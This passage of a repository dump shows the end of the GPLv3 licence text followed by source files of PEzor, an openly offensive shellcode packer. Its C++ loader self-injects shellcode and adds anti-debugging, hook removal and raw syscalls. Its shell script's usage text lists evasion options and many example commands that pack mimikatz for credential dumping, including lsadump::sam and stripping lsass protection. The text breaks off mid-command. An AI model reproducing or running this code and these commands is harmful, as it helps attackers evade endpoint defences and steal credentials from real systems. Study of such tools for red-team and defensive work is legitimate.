equivalent access to the\n    Corresponding Source in the same way through the same place at no\n    further charge.  You need not require recipients to copy the\n    Corresponding Source along with the object code.  If the place to\n    copy the object code is a network server, the Corresponding Source\n    may be on a different server (operated by you or a third party)\n    that supports equivalent copying facilities, provided you maintain\n    clear directions next to the object code saying where to find the\n    Corresponding Source.  Regardless of what server hosts the\n    Corresponding Source, you remain obligated to ensure that it is\n    available for as long as needed to satisfy these requirements.\n\n    e) Convey the object code using peer-to-peer transmission, provided\n    you inform other peers where the object code and Corresponding\n    Source of the work are being offered to the general public at no\n    charge under subsection 6d.\n\n  A separable portion of the object code, whose source code is excluded\nfrom the Corresponding Source as a System Library, need not be\nincluded in conveying the object code work.\n\n  A \"User Product\" is either (1) a \"consumer product\", which means any\ntangible personal property which is normally used for personal, family,\nor household purposes, or (2) anything designed or sold for incorporation\ninto a dwelling.  In determining whether a product is a consumer product,\ndoubtful cases shall be resolved in favor of coverage.  For a particular\nproduct received by a particular user, \"normally used\" refers to a\ntypical or common use of that class of product, regardless of the status\nof the particular user or of the way in which the particular user\nactually uses, or expects or is expected to use, the product.  A product\nis a consumer product regardless of whether the product has substantial\ncommercial, industrial or non-consumer uses, unless such uses represent\nthe only significant mode of use of the product.\n\n  \"Installation Information\" for a User Product means any methods,\nprocedures, authorization keys, or other information required to install\nand execute modified versions of a covered work in that User Product from\na modified version of its Corresponding Source.  The information must\nsuffice to ensure that the continued functioning of the modified object\ncode is in no case prevented or interfered with solely because\nmodification has been made.\n\n  If you convey an object code work under this section in, or with, or\nspecifically for use in, a User Product, and the conveying occurs as\npart of a transaction in which the right of possession and use of the\nUser Product is transferred to the recipient in perpetuity or for a\nfixed term (regardless of how the transaction is characterized), the\nCorresponding Source conveyed under this section must be accompanied\nby the Installation Information.  But this requirement does not apply\nif neither you nor any third party retains the ability to install\nmodified object code on the User Product (for example, the work has\nbeen installed in ROM).\n\n  The requirement to provide Installation Information does not include a\nrequirement to continue to provide support service, warranty, or updates\nfor a work that has been modified or installed by the recipient, or for\nthe User Product in which it has been modified or installed.  Access to a\nnetwork may be denied when the modification itself materially and\nadversely affects the operation of the network or violates the rules and\nprotocols for communication across the network.\n\n  Corresponding Source conveyed, and Installation Information provided,\nin accord with this section must be in a format that is publicly\ndocumented (and with an implementation available to the public in\nsource code form), and must require no special password or key for\nunpacking, reading or copying.\n\n  7. Additional Terms.\n\n  \"Additional permissions\" are terms that supplement the terms of this\nLicense by making exceptions from one or more of its conditions.\nAdditional permissions that are applicable to the entire Program shall\nbe treated as though they were included in this License, to the extent\nthat they are valid under applicable law.  If additional permissions\napply only to part of the Program, that part may be used separately\nunder those permissions, but the entire Program remains governed by\nthis License without regard to the additional permissions.\n\n  When you convey a copy of a covered work, you may at your option\nremove any additional permissions from that copy, or from any part of\nit.  (Additional permissions may be written to require their own\nremoval in certain cases when you modify the work.)  You may place\nadditional permissions on material, added by you to a covered work,\nfor which you have or can give appropriate copyright permission.\n\n  Notwithstanding any other provision of this License, for material you\nadd to a covered work, you may (if authorized by the copyright holders of\nthat material) supplement the terms of this License with terms:\n\n    a) Disclaiming warranty or limiting liability differently from the\n    terms of sections 15 and 16 of this License; or\n\n    b) Requiring preservation of specified reasonable legal notices or\n    author attributions in that material or in the Appropriate Legal\n    Notices displayed by works containing it; or\n\n    c) Prohibiting misrepresentation of the origin of that material, or\n    requiring that modified versions of such material be marked in\n    reasonable ways as different from the original version; or\n\n    d) Limiting the use for publicity purposes of names of licensors or\n    authors of the material; or\n\n    e) Declining to grant rights under trademark law for use of some\n    trade names, trademarks, or service marks; or\n\n    f) Requiring indemnification of licensors and authors of that\n    material by anyone who conveys the material (or modified versions of\n    it) with contractual assumptions of liability to the recipient, for\n    any liability that these contractual assumptions directly impose on\n    those licensors and authors.\n\n  All other non-permissive additional terms are considered \"further\nrestrictions\" within the meaning of section 10.  If the Program as you\nreceived it, or any part of it, contains a notice stating that it is\ngoverned by this License along with a term that is a further\nrestriction, you may remove that term.  If a license document contains\na further restriction but permits relicensing or conveying under this\nLicense, you may add to a covered work material governed by the terms\nof that license document, provided that the further restriction does\nnot survive such relicensing or conveying.\n\n  If you add terms to a covered work in accord with this section, you\nmust place, in the relevant source files, a statement of the\nadditional terms that apply to those files, or a notice indicating\nwhere to find the applicable terms.\n\n  Additional terms, permissive or non-permissive, may be stated in the\nform of a separately written license, or stated as exceptions;\nthe above requirements apply either way.\n\n  8. Termination.\n\n  You may not propagate or modify a covered work except as expressly\nprovided under this License.  Any attempt otherwise to propagate or\nmodify it is void, and will automatically terminate your rights under\nthis License (including any patent licenses granted under the third\nparagraph of section 11).\n\n  However, if you cease all violation of this License, then your\nlicense from a particular copyright holder is reinstated (a)\nprovisionally, unless and until the copyright holder explicitly and\nfinally terminates your license, and (b) permanently, if the copyright\nholder fails to notify you of the violation by some reasonable means\nprior to 60 days after the cessation.\n\n  Moreover, your license from a particular copyright holder is\nreinstated permanently if the copyright holder notifies you of the\nviolation by some reasonable means, this is the first time you have\nreceived notice of violation of this License (for any work) from that\ncopyright holder, and you cure the violation prior to 30 days after\nyour receipt of the notice.\n\n  Termination of your rights under this section does not terminate the\nlicenses of parties who have received copies or rights from you under\nthis License.  If your rights have been terminated and not permanently\nreinstated, you do not qualify to receive new licenses for the same\nmaterial under section 10.\n\n  9. Acceptance Not Required for Having Copies.\n\n  You are not required to accept this License in order to receive or\nrun a copy of the Program.  Ancillary propagation of a covered work\noccurring solely as a consequence of using peer-to-peer transmission\nto receive a copy likewise does not require acceptance.  However,\nnothing other than this License grants you permission to propagate or\nmodify any covered work.  These actions infringe copyright if you do\nnot accept this License.  Therefore, by modifying or propagating a\ncovered work, you indicate your acceptance of this License to do so.\n\n  10. Automatic Licensing of Downstream Recipients.\n\n  Each time you convey a covered work, the recipient automatically\nreceives a license from the original licensors, to run, modify and\npropagate that work, subject to this License.  You are not responsible\nfor enforcing compliance by third parties with this License.\n\n  An \"entity transaction\" is a transaction transferring control of an\norganization, or substantially all assets of one, or subdividing an\norganization, or merging organizations.  If propagation of a covered\nwork results from an entity transaction, each party to that\ntransaction who receives a copy of the work also receives whatever\nlicenses to the work the party's predecessor in interest had or could\ngive under the previous paragraph, plus a right to possession of the\nCorresponding Source of the work from the predecessor in interest, if\nthe predecessor has it or can get it with reasonable efforts.\n\n  You may not impose any further restrictions on the exercise of the\nrights granted or affirmed under this License.  For example, you may\nnot impose a license fee, royalty, or other charge for exercise of\nrights granted under this License, and you may not initiate litigation\n(including a cross-claim or counterclaim in a lawsuit) alleging that\nany patent claim is infringed by making, using, selling, offering for\nsale, or importing the Program or any portion of it.\n\n  11. Patents.\n\n  A \"contributor\" is a copyright holder who authorizes use under this\nLicense of the Program or a work on which the Program is based.  The\nwork thus licensed is called the contributor's \"contributor version\".\n\n  A contributor's \"essential patent claims\" are all patent claims\nowned or controlled by the contributor, whether already acquired or\nhereafter acquired, that would be infringed by some manner, permitted\nby this License, of making, using, or selling its contributor version,\nbut do not include claims that would be infringed only as a\nconsequence of further modification of the contributor version.  For\npurposes of this definition, \"control\" includes the right to grant\npatent sublicenses in a manner consistent with the requirements of\nthis License.\n\n  Each contributor grants you a non-exclusive, worldwide, royalty-free\npatent license under the contributor's essential patent claims, to\nmake, use, sell, offer for sale, import and otherwise run, modify and\npropagate the contents of its contributor version.\n\n  In the following three paragraphs, a \"patent license\" is any express\nagreement or commitment, however denominated, not to enforce a patent\n(such as an express permission to practice a patent or covenant not to\nsue for patent infringement).  To \"grant\" such a patent license to a\nparty means to make such an agreement or commitment not to enforce a\npatent against the party.\n\n  If you convey a covered work, knowingly relying on a patent license,\nand the Corresponding Source of the work is not available for anyone\nto copy, free of charge and under the terms of this License, through a\npublicly available network server or other readily accessible means,\nthen you must either (1) cause the Corresponding Source to be so\navailable, or (2) arrange to deprive yourself of the benefit of the\npatent license for this particular work, or (3) arrange, in a manner\nconsistent with the requirements of this License, to extend the patent\nlicense to downstream recipients.  \"Knowingly relying\" means you have\nactual knowledge that, but for the patent license, your conveying the\ncovered work in a country, or your recipient's use of the covered work\nin a country, would infringe one or more identifiable patents in that\ncountry that you have reason to believe are valid.\n\n  If, pursuant to or in connection with a single transaction or\narrangement, you convey, or propagate by procuring conveyance of, a\ncovered work, and grant a patent license to some of the parties\nreceiving the covered work authorizing them to use, propagate, modify\nor convey a specific copy of the covered work, then the patent license\nyou grant is automatically extended to all recipients of the covered\nwork and works based on it.\n\n  A patent license is \"discriminatory\" if it does not include within\nthe scope of its coverage, prohibits the exercise of, or is\nconditioned on the non-exercise of one or more of the rights that are\nspecifically granted under this License.  You may not convey a covered\nwork if you are a party to an arrangement with a third party that is\nin the business of distributing software, under which you make payment\nto the third party based on the extent of your activity of conveying\nthe work, and under which the third party grants, to any of the\nparties who would receive the covered work from you, a discriminatory\npatent license (a) in connection with copies of the covered work\nconveyed by you (or copies made from those copies), or (b) primarily\nfor and in connection with specific products or compilations that\ncontain the covered work, unless you entered into that arrangement,\nor that patent license was granted, prior to 28 March 2007.\n\n  Nothing in this License shall be construed as excluding or limiting\nany implied license or other defenses to infringement that may\notherwise be available to you under applicable patent law.\n\n  12. No Surrender of Others' Freedom.\n\n  If conditions are imposed on you (whether by court order, agreement or\notherwise) that contradict the conditions of this License, they do not\nexcuse you from the conditions of this License.  If you cannot convey a\ncovered work so as to satisfy simultaneously your obligations under this\nLicense and any other pertinent obligations, then as a consequence you may\nnot convey it at all.  For example, if you agree to terms that obligate you\nto collect a royalty for further conveying from those to whom you convey\nthe Program, the only way you could satisfy both those terms and this\nLicense would be to refrain entirely from conveying the Program.\n\n  13. Use with the GNU Affero General Public License.\n\n  Notwithstanding any other provision of this License, you have\npermission to link or combine any covered work with a work licensed\nunder version 3 of the GNU Affero General Public License into a single\ncombined work, and to convey the resulting work.  The terms of this\nLicense will continue to apply to the part which is the covered work,\nbut the special requirements of the GNU Affero General Public License,\nsection 13, concerning interaction through a network will apply to the\ncombination as such.\n\n  14. Revised Versions of this License.\n\n  The Free Software Foundation may publish revised and/or new versions of\nthe GNU General Public License from time to time.  Such new versions will\nbe similar in spirit to the present version, but may differ in detail to\naddress new problems or concerns.\n\n  Each version is given a distinguishing version number.  If the\nProgram specifies that a certain numbered version of the GNU General\nPublic License \"or any later version\" applies to it, you have the\noption of following the terms and conditions either of that numbered\nversion or of any later version published by the Free Software\nFoundation.  If the Program does not specify a version number of the\nGNU General Public License, you may choose any version ever published\nby the Free Software Foundation.\n\n  If the Program specifies that a proxy can decide which future\nversions of the GNU General Public License can be used, that proxy's\npublic statement of acceptance of a version permanently authorizes you\nto choose that version for the Program.\n\n  Later license versions may give you additional or different\npermissions.  However, no additional obligations are imposed on any\nauthor or copyright holder as a result of your choosing to follow a\nlater version.\n\n  15. Disclaimer of Warranty.\n\n  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY\nAPPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT\nHOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY\nOF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\nPURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM\nIS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF\nALL NECESSARY SERVICING, REPAIR OR CORRECTION.\n\n  16. Limitation of Liability.\n\n  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING\nWILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS\nTHE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY\nGENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE\nUSE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF\nDATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD\nPARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),\nEVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF\nSUCH DAMAGES.\n\n  17. Interpretation of Sections 15 and 16.\n\n  If the disclaimer of warranty and limitation of liability provided\nabove cannot be given local legal effect according to their terms,\nreviewing courts shall apply local law that most closely approximates\nan absolute waiver of all civil liability in connection with the\nProgram, unless a warranty or assumption of liability accompanies a\ncopy of the Program in return for a fee.\n\n                     END OF TERMS AND CONDITIONS\n\n            How to Apply These Terms to Your New Programs\n\n  If you develop a new program, and you want it to be of the greatest\npossible use to the public, the best way to achieve this is to make it\nfree software which everyone can redistribute and change under these terms.\n\n  To do so, attach the following notices to the program.  It is safest\nto attach them to the start of each source file to most effectively\nstate the exclusion of warranty; and each file should have at least\nthe \"copyright\" line and a pointer to where the full notice is found.\n\n    {one line to give the program's name and a brief idea of what it does.}\n    Copyright (C) {year}  {name of author}\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nAlso add information on how to contact you by electronic and paper mail.\n\n  If the program does terminal interaction, make it output a short\nnotice like this when it starts in an interactive mode:\n\n    {project}  Copyright (C) {year}  {fullname}\n    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.\n    This is free software, and you are welcome to redistribute it\n    under certain conditions; type `show c' for details.\n\nThe hypothetical commands `show w' and `show c' should show the appropriate\nparts of the General Public License.  Of course, your program's commands\nmight be different; for a GUI interface, you would use an \"about box\".\n\n  You should also get your employer (if you work as a programmer) or school,\nif any, to sign a \"copyright disclaimer\" for the program, if necessary.\nFor more information on this, and how to apply and follow the GNU GPL, see\n<http://www.gnu.org/licenses/>.\n\n  The GNU General Public License does not permit incorporating your program\ninto proprietary programs.  If your program is a subroutine library, you\nmay consider it more useful to permit linking proprietary applications with\nthe library.  If this is what you want to do, use the GNU Lesser General\nPublic License instead of this License.  But first, please read\n<http://www.gnu.org/philosophy/why-not-lgpl.html>.\n"
        },
        {
          "name": "PEzor.cpp",
          "type": "blob",
          "size": 5.712890625,
          "content": "#pragma clang diagnostic ignored \"-Wnested-anon-types\"\n#pragma clang diagnostic ignored \"-Wgnu-anonymous-struct\"\n\n#ifdef SHAREDOBJECT\n#ifdef REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN\n#include \"ReflectiveDLLInjection/dll/src/ReflectiveLoader.h\"\nextern HINSTANCE hAppInstance;\n#endif\n#endif\n\n#include \"PEzor.hpp\"\n\n#define NT_FAIL(status) (status < 0)\n#define FLG_HEAP_ENABLE_TAIL_CHECK 0x10\n#define FLG_HEAP_ENABLE_FREE_CHECK 0x20\n#define FLG_HEAP_VALIDATE_PARAMETERS 0x40\n#define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)\n\n#ifdef ANTIDEBUG\ninline void anti_debug(void) {\n    DWORD errorValue = 1111;\n    SetLastError(errorValue);\n    OutputDebugString(\" \");\n    if (GetLastError() != errorValue) {\n        #ifdef _DEBUG_\n            MessageBoxA(NULL, \"Stop debugging program!\", \"Error\", MB_OK | MB_ICONERROR);\n        #endif\n        exit(STATUS_SUCCESS);\n    }\n\n    __PPEB peb = GetProcessEnvironmentBlock();\n    if (peb->bBeingDebugged) {\n        #ifdef _DEBUG_\n            MessageBoxA(NULL, \"Stop debugging program!\", \"Error\", MB_OK | MB_ICONERROR);\n        #endif\n        exit(STATUS_SUCCESS);\n    }\n\n    if (peb->dwNtGlobalFlag & NT_GLOBAL_FLAG_DEBUGGED) {\n        #ifdef _DEBUG_\n            MessageBoxA(NULL, \"Stop debugging program!\", \"Error\", MB_OK | MB_ICONERROR);\n        #endif\n        exit(STATUS_SUCCESS);\n    }\n}\n#endif\n\nint _main(int argc, char** argv) {\n    #ifdef _DEBUG_\n        puts(\"PEzor starting!\");\n    #endif\n    #ifdef ANTIDEBUG\n        #ifdef _DEBUG_\n            puts(\"anti-debug checks\");\n        #endif\n        anti_debug();\n    #endif\n    #ifdef UNHOOK\n        #ifdef _DEBUG_\n            puts(\"unhooking process\");\n        #endif\n        RefreshPE();\n    #endif\n    #ifdef SYSCALLS\n        my_init_syscalls_list();\n    #endif\n    HANDLE hThread = (HANDLE)-1;\n    #if defined(SHAREDOBJECT) || defined(SERVICE_DLL)\n        LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, FALSE, sleep_time);\n    #else\n        LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, TRUE, sleep_time);\n    #endif\n    if (!allocation || hThread == (HANDLE)-1) {\n        #ifdef _DEBUG_\n            printf(\"inject_shellcode_self: ERROR 0x%x\", allocation);\n        #endif\n        return -1;\n    }\n\n    #ifdef _DEBUG_\n        puts(\"inject_shellcode_self: OK\");\n    #endif\n    return 0;\n}\n\n#ifdef SHAREDOBJECT\nextern \"C\"\n__declspec(dllexport)\nvoid CALLBACK StartW(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow) {\n    while (TRUE)\n        Sleep(60000);\n}\n\n__declspec(dllexport)\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {\n    switch (dwReason) {\n        #ifdef REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN\n        case DLL_QUERY_HMODULE:\n            #ifdef _DEBUG_\n                puts(\"DLL_QUERY_HMODULE\");\n            #endif\n            if (lpReserved != NULL)\n                *(HMODULE *)lpReserved = hAppInstance;\n\t\tbreak;\n        #endif\n        case DLL_PROCESS_ATTACH:\n        #ifdef _DEBUG_\n            puts(\"DLL_PROCESS_ATTACH\");\n        #endif\n        #ifndef SERVICE_DLL\n            _main(0, NULL);\n        #endif\n        break;\n        case DLL_THREAD_ATTACH:\n        #ifdef _DEBUG_\n            puts(\"DLL_THREAD_ATTACH\");\n        #endif\n        break;\n        case DLL_PROCESS_DETACH:\n        #ifdef _DEBUG_\n            puts(\"DLL_PROCESS_DETACH\");\n        #endif\n        break;\n        case DLL_THREAD_DETACH:\n        #ifdef _DEBUG_\n            puts(\"DLL_THREAD_DETACH\");\n        #endif\n        break;\n    }\n\n    return TRUE;\n}\n#endif\n\n#ifdef SERVICE_EXE\n#include <winsvc.h>\nSERVICE_STATUS_HANDLE g_serviceStatusHandle = nullptr;\nHANDLE g_hSvcStopEvent = NULL;\nSERVICE_STATUS g_serviceStatus = {SERVICE_WIN32_SHARE_PROCESS, SERVICE_START_PENDING, SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE};\nchar cServiceName[] = \"SERVICE\";\n\n__attribute__((stdcall))\nDWORD HandlerEx(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {\n    switch (dwControl) {\n        case SERVICE_CONTROL_STOP:\n            g_serviceStatus.dwCurrentState = SERVICE_STOPPED;\n            break;\n        case SERVICE_CONTROL_SHUTDOWN:\n            g_serviceStatus.dwCurrentState = SERVICE_STOPPED;\n            break;\n        case SERVICE_CONTROL_PAUSE:\n            g_serviceStatus.dwCurrentState = SERVICE_PAUSED;\n            break;\n        case SERVICE_CONTROL_CONTINUE:\n            g_serviceStatus.dwCurrentState = SERVICE_RUNNING;\n            break;\n        case SERVICE_CONTROL_INTERROGATE:\n        default:\n            break;\n    }\n \n    SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus);\n \n    return NO_ERROR;\n}\n\n#ifdef SERVICE_DLL\nextern \"C\"\n__declspec(dllexport)\n#endif\nVOID ServiceMain(DWORD dwArgc, LPCWSTR* lpszArgv) {\n    if (dwArgc > 0)\n        g_serviceStatusHandle = RegisterServiceCtrlHandlerW(lpszArgv[0], (LPHANDLER_FUNCTION)HandlerEx);\n    else\n        g_serviceStatusHandle = RegisterServiceCtrlHandlerW(L\"SvcHostDemo\", (LPHANDLER_FUNCTION)HandlerEx);\n\n    if (!g_serviceStatusHandle) {\n        g_serviceStatus.dwCurrentState = SERVICE_STOPPED;\n        g_serviceStatus.dwWin32ExitCode = SERVICE_ERROR_SEVERE;\n        SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus);\n        return;\n    }\n\n    g_serviceStatus.dwCurrentState = SERVICE_RUNNING;\n    SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus);\n\n    _main(0, NULL);\n}\n\n#ifndef SERVICE_DLL\nint __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n\tSERVICE_TABLE_ENTRY st[] = {\n        { (LPSTR)&cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&ServiceMain },\n        { NULL, NULL }\n    };\n\treturn StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&st );\n}\n#endif\n#else\nint main(int argc, char** argv) {\n    return _main(argc, argv);\n}\n#endif\n"
        },
        {
          "name": "PEzor.hpp",
          "type": "blob",
          "size": 0.21484375,
          "content": "#ifndef _HELLO_HPP_\n#define _HELLO_HPP_\n\n#include <windows.h>\n#ifdef _DEBUG_\n#include <iostream>\n#endif\n\n#include \"inject.hpp\"\n#include \"shellcode.hpp\"\n#include \"sleep.hpp\"\n\nextern \"C\" {\n    #include \"loader.h\"\n}\n\n#endif"
        },
        {
          "name": "PEzor.sh",
          "type": "blob",
          "size": 27.4755859375,
          "content": "#!/usr/bin/env bash\n\nVERSION=\"3.3.0\"\n\ncowsay -f dragon 'PEzor!! v'$VERSION 2>/dev/null || echo 'PEzor!! v'$VERSION\necho '---------------------------------------------------------------------------'\necho 'Read the blog posts here:'\necho 'https://iwantmore.pizza/posts/PEzor.html'\necho 'https://iwantmore.pizza/posts/PEzor2.html'\necho 'https://iwantmore.pizza/posts/PEzor3.html'\necho 'https://iwantmore.pizza/posts/PEzor4.html'\necho 'Based on:'\necho 'https://github.com/TheWover/donut'\necho 'https://github.com/EgeBalci/sgn'\necho 'https://github.com/JustasMasiulis/inline_syscall'\necho 'https://github.com/CylanceVulnResearch/ReflectiveDLLRefresher'\necho '---------------------------------------------------------------------------'\n\nCURRENT_DIR=`pwd`\nINSTALL_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nTMP_DIR=`mktemp -d`\nSGN=false\nBLOB=false\nOUTPUT_DIR=false\nIS_SHELLCODE=false\nBITS=64\nFORCED_BITS=false\nSLEEP=0\nDEBUG=false\nSYSCALLS=false\nUNHOOK=false\nANTIDEBUG=false\nTEXT=false\nSELF=false\nRX=false\nSDK=4.5\nCC=x86_64-w64-mingw32-clang\nCXX=x86_64-w64-mingw32-clang++\nLD=x86_64-w64-mingw32-ld\nOUTPUT_FORMAT=exe\nOUTPUT_EXTENSION=exe\nCLEANUP=false\nSOURCES=\"\"\nFLUCTUATE=false\nXOR_KEY=false\nDLL_SIDELOAD=false\nORIGINAL_DLL=false\nNEW_DLL_NAME=false\n\nusage() {\n    echo 'Usage PE:        ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] [-rx] [-format=<FORMAT>] <executable.exe> [donut args]'\n    echo 'Usage Shellcode: ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] [-rx] [-format=<FORMAT>] <shellcode.bin>'\n    echo ''\n    echo \"USAGE\n\n# PEzor [options...] <EXECUTABLE> [donut args...]\n\nOPTIONS\n  -h                        Show usage and exits\n  -32                       Force 32-bit executable\n  -64                       Force 64-bit executable\n  -debug                    Generate a debug build\n  -unhook                   User-land hooks removal\n  -antidebug                Add anti-debug checks\n  -syscalls                 Use raw syscalls [64-bit only] [Windows 10+ only]\n  -sgn                      Encode the generated shellcode with sgn\n  -text                     Store shellcode in .text section instead of .data\n  -rx                       Allocate RX memory for shellcode\n  -self                     Execute the shellcode in the same thread\n  -sdk=VERSION              Use specified .NET Framework version (2, 4, 4.5 (default))\n  -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)\n  -sleep=N                  Sleeps for N seconds before unpacking the shellcode\n  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)\n  -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()\n  -xorkey=KEY               Encrypt payload with a simple multibyte XOR, it retrieves the key at runtime by using GetComputerNameExA(ComputerNameDnsFullyQualified)\n  -dll-sideload=DLL         Generate a DLL that will proxy the execution to another library\n  [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2\n\nEXAMPLES\n  # 64-bit (self-inject RWX)\n  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/x64/mimikatz.exe -z 2\n  # 64-bit (self-inject RX)\n  $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2\n  # 64-bit (raw syscalls)\n  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2\n  # 64-bit (fluctuate to READWRITE when sleeping)\n  $ PEzor.sh -fluctuate=RW -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\\\"coffee\\\" \\\"sleep 5000\\\" \\\"coffee\\\" \\\"exit\\\"'\n  # 64-bit (fluctuate to NOACCESS when sleeping)\n  $ PEzor.sh -fluctuate=NA -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\\\"coffee\\\" \\\"sleep 5000\\\" \\\"coffee\\\" \\\"exit\\\"'\n  # 64-bit (use environmental keying with GetComputerNameExA)\n  $ PEzor.sh -xorkey=MY-FQDN-MACHINE-NAME -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\\\"coffee\\\" \\\"sleep 5000\\\" \\\"coffee\\\" \\\"exit\\\"'\n  # 64-bit (support EXEs with resource by keeping PE headers in memory)\n  $ PEzor.sh -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -k 2 -p '\\\"!+\\\" \\\"!processprotect\\\" \\\"/process:lsass.exe\\\" \\\"/remove\\\" \\\"!-\\\" \\\"exit\\\"'\n  # 64-bit (beacon object file)\n  $ PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p '\\\"log c:\\users\\public\\mimi.out\\\" \\\"token::whoami\\\" \\\"exit\\\"'\n  # 64-bit (beacon object file w/ cleanup)\n  $ PEzor.sh -format=bof -cleanup mimikatz/x64/mimikatz.exe -z 2 -p '\\\"log c:\\users\\public\\mimi.out\\\" \\\"token::whoami\\\" \\\"exit\\\"'\n  # 64-bit (dll)\n  $ PEzor.sh -format=dll mimikatz/x64/mimikatz.exe -z 2 -p '\\\"log c:\\users\\public\\mimi.out\\\" \\\"token::whoami\\\" \\\"exit\\\"'\n  # 64-bit (dll sideload)\n  $ PEzor.sh -format=dll -dll-sideload=version.dll mimikatz/x64/mimikatz.exe -z 2 -p '\\\"log c:\\users\\public\\mimi.out\\\" \\\"token::whoami\\\" \\\"exit\\\"'\n  # 64-bit (reflective dll)\n  $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p '\\\"log c:\\users\\public\\mimi.out\\\" \\\"token::whoami\\\" \\\"exit\\\"'\n  # 64-bit (service exe)\n  $ PEzor.sh -format=service-exe mimikatz/x64/mimikatz.exe -z 2 -p '\\\"log c:\\users\\public\\mimi.out\\\" \\\"token::whoami\\\" \\\"exit\\\"'\n  # 64-bit (service dll)\n  $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p '\\\"log c:\\users\\public\\mimi.out\\\" \\\"token::whoami\\\" \\\"exit\\\"'\n  # 64-bit (dotnet)\n  $ PEzor.sh -format=dotnet -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\\\"log c:\\users\\public\\mimi.out\\\" \\\"token::whoami\\\" \\\"exit\\\"'\n  # 64-bit (dotnet-pinvoke)\n  $ PEzor.sh -format=dotnet-pinvoke -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\\\"log c:\\users\\public\\mimi.out\\\" \\\"token::whoami\\\" \\\"exit\\\"'\n  # 64-bit (dotnet-createsection)\n  $ PEzor.sh -format=dotnet-createsection -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\\\"log c:\\users\\public\\mimi.out\\\" \\\"token::whoami\\\" \\\"exit\\\"'\n  # 32-bit (self-inject)\n  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2\n  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)\n  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2\n  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread) and arguments for donut\n  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2 \\\"-plsadump::sam 